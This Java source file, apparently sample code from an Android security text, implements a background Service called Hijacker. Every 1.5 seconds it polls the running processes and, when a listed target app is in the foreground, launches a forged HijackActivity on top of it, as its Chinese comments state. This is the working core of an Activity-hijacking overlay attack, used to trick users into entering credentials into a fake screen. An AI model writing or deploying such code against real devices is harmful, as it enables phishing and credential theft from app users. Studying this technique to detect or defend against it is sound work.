package com.droider.hijackactivity;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;


public class Hijacker extends Service{
	private boolean started = false;
	private List<String> mhijackingList;		//劫持的进程列表
	private Timer mTimer = new Timer();
	private TimerTask mTask = new TimerTask() {	
		
		@Override
		public void run() {
			Log.d("com.droider.hijacker", "timertask start..");
			ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
			started = true;
			List<RunningAppProcessInfo> infos = am.getRunningAppProcesses(); //枚举正在运行的进程列表
			for (RunningAppProcessInfo psinfo : infos) {
				if (psinfo.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) { //前台进程
					if (mhijackingList.contains(psinfo.processName)) {
						Log.d("com.droider.hijacker", "hijacking start..");
						Intent intent = new Intent(getBaseContext(), HijackActivity.class);
						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						intent.putExtra("processname", psinfo.processName);
						getApplication().startActivity(intent);		//启动伪造的Activity						
					}
				}
			}
		}
	};
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}

	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d("com.droider.hijacker", "service start..");
		mhijackingList = ((MyApp) getApplication()).hijackingList;
		if (!started)
			mTimer.scheduleAtFixedRate(mTask, 2000, 1500);		//定时检查启动的进程列表中是否有被劫持的程序
		return super.onStartCommand(intent, flags, startId);
	}	
	
}
